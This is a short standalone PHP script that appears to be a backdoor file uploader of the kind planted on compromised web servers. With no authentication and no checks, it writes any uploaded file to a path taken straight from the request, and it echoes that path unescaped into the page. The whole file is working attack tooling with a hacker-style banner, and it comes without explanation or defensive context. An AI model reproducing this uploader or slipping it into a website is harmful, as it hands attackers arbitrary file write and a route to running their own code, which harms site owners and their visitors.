<?php
$files = @$_FILES["files"];
if ($files["name"] != '') {
    $fullpath = $_REQUEST["path"] . $files["name"];
    if (move_uploaded_file($files['tmp_name'], $fullpath)) {
        echo "<h1><a href='$fullpath'><center>UPLOADED!</a></h1>";
    }
}echo '<html><head></head><body><center><form method=POST enctype="multipart/form-data" action=""><input type=hidden name=path><b><font color=white size=5>Uploader::<label><input type="file" name="files"></label><input type=submit value="Up"></form></body></html>';
?>
